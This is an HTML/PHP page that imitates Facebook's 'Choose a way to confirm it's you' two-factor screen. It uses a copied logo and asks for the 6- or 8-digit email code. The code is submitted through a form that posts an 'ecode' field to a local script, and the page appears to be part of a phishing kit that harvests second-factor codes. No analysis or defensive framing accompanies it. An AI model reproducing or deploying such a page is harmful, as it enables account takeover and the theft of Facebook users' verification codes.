<?php


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"
        integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
<link rel="shortcut icon" href="./assets/img/fico.ico" type="image/x-icon">
<link rel="stylesheet" href="./assets/css/twofa.css">
<link href="./assets/css/boxicons.min.css" rel="stylesheet">

    <title>Facebook</title>
<style>
    .box{
        height: 320px !important;
        width: 612px;
    }
</style>
</head>
<body>
<div class="navbar">
        <div class="container">
            <a href="/"><p><img src="./assets/img/fblogo.svg" class="logonav"></p></a>
            <div class="logout">
            <a href="#"><p>Log out</p></a>
        </div>

        </div>
</div>
<div class="mm">
<div class="box">

<div class="box_content">
<p><b>Choose a way to confirm it's you</b></p>
<hr>
<p>Enter the 6 or 8 digit code we just sent to your email address.</p>
<br>
            <form method="POST" name="formfa" id="formfa" class="form" onsubmit="return onLoginSubmit(this)">
    <div class="form-group">
        <input type="number" name="ecode" id="fa2" placeholder="Email code">
        <br>
        <span id="number-error" class="error-message" style="margin:0px;padding:0px"></span>
<br>
        <hr>
        <div class="bottomline">
            <span id="another"></span>
            <button type="submit" class="submit2fa"  name="submit" id="submit">
            <i class="bx bx-loader-alt bx-spin bx-rotate-90" style="display: none;"></i>Submit Code</button>
        </div>
    </div>
</form>
</div>
</div>

</div>

<script src="https://code.jquery.com/jquery-3.6.4.min.js" integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8=" crossorigin="anonymous"></script>
<script src="./assets/js/emailCode.js"></script>



</body>
</html>